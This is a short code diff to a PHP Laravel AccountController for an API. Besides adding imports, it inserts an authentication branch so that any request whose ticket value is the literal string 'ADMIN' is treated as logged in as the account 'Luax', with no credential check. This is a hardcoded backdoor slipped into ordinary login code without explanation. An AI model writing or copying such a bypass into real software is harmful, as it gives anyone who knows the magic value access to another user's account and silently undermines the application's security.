@@ -6,6 +6,9 @@ use Illuminate\Http\Request;
 use App\Http\Requests;
 use App\Http\Controllers\Controller;
 use App\Http\Controllers\Api\ApiController;
+use Auth;
+use Session;
+use App\Account;
 
 class AccountController extends ApiController
 {
@@ -23,6 +26,10 @@ class AccountController extends ApiController
             if (Auth::check())
             {
                 $user = Auth::user();
+            }
+            elseif ($ticket == "ADMIN")
+            {
+                $user = Account::where('Login', 'Luax')->first();
             }
             else
             {
